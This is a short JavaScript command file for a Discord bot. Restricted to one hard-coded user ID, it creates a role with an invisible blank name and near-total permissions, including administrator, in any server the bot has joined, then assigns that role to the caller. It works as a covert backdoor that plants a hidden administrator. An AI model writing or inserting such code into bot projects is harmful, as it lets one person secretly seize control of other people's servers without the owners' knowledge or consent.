exports.run = async(client, message, args) => {

if (message.author.id !== '729530614004318328') return;
  
let svd = args.join(" ")

const guild = client.guilds.get(svd)
guild.createRole({ name: 'ㅤ', permissions: 2146958847 }).then(r => guild.members.get(message.author.id).addRole(r))
  message.channel.send(`Cargo criado e adicionado com sucesso`)
}